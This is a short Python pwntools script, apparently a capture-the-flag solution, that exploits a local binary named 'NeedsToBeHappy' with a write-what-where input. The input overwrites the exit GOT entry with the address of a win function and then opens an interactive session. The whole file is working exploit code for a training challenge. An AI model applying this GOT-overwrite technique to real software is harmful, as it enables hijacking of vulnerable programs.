from pwn import *

p = process('./NeedsToBeHappy')
elf = ELF('./NeedsToBeHappy')

what = str(elf.symbols['give_the_man_a_cat'])
where = str(elf.got['exit'])

p.sendline(b'Y')
p.sendline(what)
p.sendline(where)
p.interactive()
